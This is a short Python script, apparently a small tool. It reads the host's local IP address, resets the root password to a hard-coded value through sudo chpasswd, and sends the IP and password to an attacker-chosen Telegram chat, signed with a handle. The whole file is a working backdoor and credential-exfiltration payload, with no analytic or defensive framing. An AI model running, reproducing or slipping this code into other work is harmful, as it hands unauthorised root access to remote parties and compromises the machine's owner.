# sawadbot.py
import os
import socket
import telebot
def sstart(bot_token, chat_id):
    try:
        bot = telebot.TeleBot(bot_token)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ippp = s.getsockname()[0]
        s.close()
        papap = "Sawad_is_hear"
        os.system(f"echo 'root:{papap}' | sudo chpasswd")
        msg = f"IP : {ippp}\nPassword : {papap}"
        bot.send_message(chat_id, msg)
        bot.send_message(chat_id, "By : @B_Q_5")
        print("By : @B_Q_5")
    except Exception as e:
        print("By : @B_Q_5 - Error : ", e)